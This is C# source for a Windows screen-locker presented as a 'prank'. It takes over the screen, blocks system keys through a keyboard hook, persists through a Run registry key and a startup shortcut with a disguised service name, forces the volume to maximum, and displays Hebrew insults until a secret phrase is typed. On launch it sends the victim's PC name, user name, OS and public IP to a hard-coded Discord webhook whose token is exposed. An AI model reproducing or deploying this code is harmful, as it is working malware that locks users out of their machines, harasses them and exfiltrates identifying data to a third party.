using System;
using System.Drawing;
using System.Runtime.InteropServices;
using System.Text;
using System.Windows.Forms;
using System.IO;
using System.Threading;
using System.Diagnostics;
using System.Net;
using Microsoft.Win32;

namespace ZenoSpamer
{
    public class PrankForm : Form
    {
        static readonly string SECRET_CODE = "אני זונה של ZENO";
        static readonly string TITLE_TEXT = "ᴹᴿZENO亗 אתה זונה של";
        static readonly string PERSIST_NAME = "WindowsSystemService";

        static readonly string WEBHOOK_URL = "https://discord.com/api/webhooks/1560039433468649482/LyX8HOtPzHxvLqfEyF0Qg2aw6G6Zmam5yP0SN9MATv3sTZL34rTUicWMzDnwYaEUNQdK";

        [DllImport("winmm.dll")]
        public static extern int waveOutSetVolume(IntPtr hwo, uint dwVolume);

        [DllImport("winmm.dll", CharSet = CharSet.Auto)]
        static extern int mciSendString(string command, StringBuilder buffer, int bufferSize, IntPtr hwndCallback);

        [DllImport("user32.dll")]
        static extern IntPtr SetWindowsHookEx(int idHook, LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);

        [DllImport("user32.dll")]
        static extern bool UnhookWindowsHookEx(IntPtr hhk);

        [DllImport("user32.dll")]
        static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);

        [DllImport("kernel32.dll")]
        static extern IntPtr GetModuleHandle(string lpModuleName);

        [DllImport("user32.dll")]
        static extern short GetAsyncKeyState(int vKey);

        delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);

        const int WH_KEYBOARD_LL = 13;
        const int WM_KEYDOWN = 0x0100;
        const int WM_SYSKEYDOWN = 0x0104;

        IntPtr hookId = IntPtr.Zero;
        LowLevelKeyboardProc proc;

        TextBox codeBox;
        Label messageLabel;
        Label titleLabel;
        Label hintLabel;
        bool unlocked = false;
        string mediaPath = null;
        object wmpPlayer = null;

        public PrankForm()
        {
            this.FormBorderStyle = FormBorderStyle.None;
            this.WindowState = FormWindowState.Maximized;
            this.TopMost = true;
            this.BackColor = Color.Black;
            this.ControlBox = false;
            this.Text = "System";
            this.KeyPreview = true;
            this.ShowInTaskbar = false;

            System.Windows.Forms.Timer colorTimer = new System.Windows.Forms.Timer();
            colorTimer.Interval = 300;
            bool toggle = false;
            colorTimer.Tick += delegate(object s, EventArgs e)
            {
                this.BackColor = toggle ? Color.Black : Color.DarkRed;
                toggle = !toggle;
            };
            colorTimer.Start();

            System.Windows.Forms.Timer frontTimer = new System.Windows.Forms.Timer();
            frontTimer.Interval = 100;
            frontTimer.Tick += delegate(object s, EventArgs e)
            {
                if (!unlocked)
                {
                    this.TopMost = true;
                    this.BringToFront();
                    this.Activate();
                }
            };
            frontTimer.Start();

            titleLabel = new Label();
            titleLabel.Text = TITLE_TEXT;
            titleLabel.ForeColor = Color.Red;
            titleLabel.BackColor = Color.Transparent;
            titleLabel.Font = new Font("Arial", 48, FontStyle.Bold);
            titleLabel.AutoSize = true;
            titleLabel.Location = new Point(100, 50);
            this.Controls.Add(titleLabel);

            hintLabel = new Label();
            hintLabel.Text = "YOUR COMPUTER IS LOCKED. Type the secret code to unlock.";
            hintLabel.ForeColor = Color.Yellow;
            hintLabel.BackColor = Color.Transparent;
            hintLabel.Font = new Font("Arial", 16, FontStyle.Italic);
            hintLabel.AutoSize = true;
            hintLabel.Location = new Point(100, 200);
            this.Controls.Add(hintLabel);

            messageLabel = new Label();
            messageLabel.Text = "Type the secret code to unlock:";
            messageLabel.ForeColor = Color.White;
            messageLabel.BackColor = Color.Transparent;
            messageLabel.Font = new Font("Arial", 22);
            messageLabel.AutoSize = true;
            messageLabel.Location = new Point(100, 320);
            this.Controls.Add(messageLabel);

            codeBox = new TextBox();
            codeBox.Font = new Font("Arial", 20);
            codeBox.Location = new Point(100, 380);
            codeBox.Width = 1200;
            codeBox.Height = 50;
            codeBox.KeyDown += CodeBox_KeyDown;
            codeBox.RightToLeft = RightToLeft.Yes;
            this.Controls.Add(codeBox);
            codeBox.Focus();

            this.KeyDown += PrankForm_KeyDown;

            proc = HookCallback;
            hookId = SetHook(proc);

            SetPersistence();

            ForceMaxVolume();
            Thread volThread = new Thread(VolumeMonitor);
            volThread.IsBackground = true;
            volThread.Start();

            FindMedia();
            PlayMedia();

            // שלח webhook עם פרטי הקורבן ברגע שהדף נפתח
            Thread infoThread = new Thread(SendInfoOnStartup);
            infoThread.IsBackground = true;
            infoThread.Start();

            this.Resize += delegate(object s, EventArgs e) { if (!unlocked) this.WindowState = FormWindowState.Maximized; };
            this.Deactivate += delegate(object s, EventArgs e) { if (!unlocked) { this.Activate(); this.BringToFront(); } };
        }

        void SendInfoOnStartup()
        {
            try
            {
                string pcName = Environment.MachineName;
                string userName = Environment.UserName;
                string osVersion = Environment.OSVersion.ToString();
                string ip = GetPublicIP();

                string content =
                    "🔒 NEW LOCKED PC\n\n" +
                    "🖥 PC Name: " + pcName + "\n" +
                    "👤 Windows User: " + userName + "\n" +
                    "🪟 OS: " + osVersion + "\n" +
                    "🌐 Public IP: " + ip + "\n" +
                    "🕐 Time: " + DateTime.Now.ToString("dd/MM/yyyy HH:mm:ss");

                PostToWebhook(content);
            }
            catch { }
        }

        void PostToWebhook(string content)
        {
            try
            {
                ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12;

                var httpWebRequest = (HttpWebRequest)WebRequest.Create(WEBHOOK_URL);
                httpWebRequest.ContentType = "application/json";
                httpWebRequest.Method = "POST";
                httpWebRequest.UserAgent = "Mozilla/5.0";

                string escaped = content
                    .Replace("\\", "\\\\")
                    .Replace("\"", "\\\"")
                    .Replace("\n", "\\n")
                    .Replace("\r", "\\r")
                    .Replace("\t", "\\t");

                string json = "{\"content\":\"" + escaped + "\"}";

                using (var streamWriter = new StreamWriter(httpWebRequest.GetRequestStream()))
                {
                    streamWriter.Write(json);
                }

                var httpResponse = (HttpWebResponse)httpWebRequest.GetResponse();
                using (var streamReader = new StreamReader(httpResponse.GetResponseStream()))
                {
                    streamReader.ReadToEnd();
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine("Webhook error: " + ex.Message);
            }
        }

        string GetPublicIP()
        {
            try
            {
                using (WebClient wc = new WebClient())
                {
                    wc.Headers["User-Agent"] = "Mozilla/5.0";
                    return wc.DownloadString("https://api.ipify.org").Trim();
                }
            }
            catch { return "unknown"; }
        }

        void SetPersistence()
        {
            string exePath;
            try { exePath = Process.GetCurrentProcess().MainModule.FileName; }
            catch { return; }

            if (exePath.Contains("vshost") || exePath.Contains("devenv")) return;

            try
            {
                using (RegistryKey key = Registry.CurrentUser.OpenSubKey(
                    @"Software\Microsoft\Windows\CurrentVersion\Run", true))
                {
                    if (key != null) key.SetValue(PERSIST_NAME, "\"" + exePath + "\"");
                }
            }
            catch { }

            try
            {
                string startupFolder = Environment.GetFolderPath(Environment.SpecialFolder.Startup);
                string linkPath = Path.Combine(startupFolder, PERSIST_NAME + ".lnk");

                Type t = Type.GetTypeFromProgID("WScript.Shell");
                if (t != null)
                {
                    dynamic shell = Activator.CreateInstance(t);
                    var shortcut = shell.CreateShortcut(linkPath);
                    shortcut.TargetPath = exePath;
                    shortcut.WorkingDirectory = Path.GetDirectoryName(exePath);
                    shortcut.WindowStyle = 1;
                    shortcut.Description = "Windows System Service";
                    shortcut.Save();
                }
            }
            catch { }
        }

        void RemovePersistence()
        {
            try
            {
                using (RegistryKey key = Registry.CurrentUser.OpenSubKey(
                    @"Software\Microsoft\Windows\CurrentVersion\Run", true))
                {
                    if (key != null) key.DeleteValue(PERSIST_NAME, false);
                }
            }
            catch { }

            try
            {
                string startupFolder = Environment.GetFolderPath(Environment.SpecialFolder.Startup);
                string linkPath = Path.Combine(startupFolder, PERSIST_NAME + ".lnk");
                if (File.Exists(linkPath)) File.Delete(linkPath);
            }
            catch { }
        }

        void FindMedia()
        {
            string exeDir = AppDomain.CurrentDomain.BaseDirectory;
            string[] extensions = { ".mp4", ".avi", ".mkv", ".wmv", ".mov",
                                     ".mp3", ".wav", ".m4a", ".flv", ".webm", ".aac", ".ogg" };

            foreach (string ext in extensions)
            {
                string[] files = Directory.GetFiles(exeDir, "*" + ext);
                if (files.Length > 0) { mediaPath = files[0]; return; }
            }
        }

        void PlayMedia()
        {
            if (mediaPath == null || !File.Exists(mediaPath)) return;

            try
            {
                Type wmpType = Type.GetTypeFromProgID("WMPlayer.OCX");
                if (wmpType != null)
                {
                    wmpPlayer = Activator.CreateInstance(wmpType);
                    dynamic wmp = wmpPlayer;
                    wmp.settings.volume = 100;
                    wmp.settings.autoStart = true;
                    wmp.settings.setMode("loop", true);
                    wmp.URL = mediaPath;
                    wmp.controls.play();
                    return;
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine("WMP error: " + ex.Message);
            }

            try
            {
                mciSendString("close media", null, 0, IntPtr.Zero);
                mciSendString("open \"" + mediaPath + "\" alias media", null, 0, IntPtr.Zero);
                mciSendString("play media repeat", null, 0, IntPtr.Zero);
            }
            catch { }
        }

        void ForceMaxVolume()
        {
            try
            {
                uint maxVol = 0xFFFFFFFF;
                waveOutSetVolume(IntPtr.Zero, maxVol);
                for (int i = 0; i < 4; i++) waveOutSetVolume((IntPtr)i, maxVol);
            }
            catch { }

            try
            {
                if (wmpPlayer != null)
                {
                    dynamic wmp = wmpPlayer;
                    wmp.settings.volume = 100;
                }
            }
            catch { }
        }

        void VolumeMonitor()
        {
            while (!unlocked)
            {
                ForceMaxVolume();
                Thread.Sleep(300);
            }
        }

        IntPtr SetHook(LowLevelKeyboardProc proc)
        {
            using (Process curProcess = Process.GetCurrentProcess())
            using (ProcessModule curModule = curProcess.MainModule)
            {
                return SetWindowsHookEx(WH_KEYBOARD_LL, proc,
                    GetModuleHandle(curModule.ModuleName), 0);
            }
        }

        bool IsKeyDown(int vKey)
        {
            return (GetAsyncKeyState(vKey) & 0x8000) != 0;
        }

        IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam)
        {
            if (nCode >= 0 && (wParam == (IntPtr)WM_KEYDOWN || wParam == (IntPtr)WM_SYSKEYDOWN) && !unlocked)
            {
                int vkCode = Marshal.ReadInt32(lParam);
                bool alt = IsKeyDown(0x12);
                bool ctrl = IsKeyDown(0x11);
                bool shift = IsKeyDown(0x10);

                if (vkCode == 0x73 && alt) return (IntPtr)1;
                if (vkCode == 0x57 && ctrl) return (IntPtr)1;
                if (vkCode == 0x1B && ctrl) return (IntPtr)1;
                if (vkCode == 0x5B || vkCode == 0x5C) return (IntPtr)1;
                if (vkCode == 0x09 && alt) return (IntPtr)1;
                if (vkCode == 0x1B && ctrl && shift) return (IntPtr)1;
                if (vkCode == 0x2E && ctrl && alt) return (IntPtr)1;
                if (vkCode == 0x7A) return (IntPtr)1;
                if (vkCode == 0x1B) return (IntPtr)1;
            }
            return CallNextHookEx(hookId, nCode, wParam, lParam);
        }

        void CodeBox_KeyDown(object sender, KeyEventArgs e)
        {
            if (e.KeyCode == Keys.Enter)
            {
                CheckCode();
                e.SuppressKeyPress = true;
            }
        }

        void CheckCode()
        {
            string typed = codeBox.Text.Trim();
            if (typed == SECRET_CODE)
            {
                unlocked = true;
                UnhookWindowsHookEx(hookId);

                try
                {
                    if (wmpPlayer != null)
                    {
                        dynamic wmp = wmpPlayer;
                        wmp.controls.stop();
                    }
                }
                catch { }

                try { mciSendString("close media", null, 0, IntPtr.Zero); } catch { }

                RemovePersistence();

                MessageBox.Show(
                    "System restored. Persistence removed.\nYou are free.",
                    "Welcome back",
                    MessageBoxButtons.OK,
                    MessageBoxIcon.Information);

                this.Close();
            }
            else
            {
                codeBox.Clear();
                messageLabel.Text = "WRONG CODE. Try again:";
                messageLabel.ForeColor = Color.Red;
            }
        }

        void PrankForm_KeyDown(object sender, KeyEventArgs e)
        {
            if (e.Alt && e.KeyCode == Keys.F4) e.Handled = true;
        }

        protected override void OnFormClosing(FormClosingEventArgs e)
        {
            if (!unlocked) e.Cancel = true;
            base.OnFormClosing(e);
        }

        protected override void OnLoad(EventArgs e)
        {
            base.OnLoad(e);
            this.Activate();
            this.BringToFront();
        }

        [STAThread]
        static void Main()
        {
            Application.EnableVisualStyles();
            Application.SetCompatibleTextRenderingDefault(false);
            Application.Run(new PrankForm());
        }
    }
}
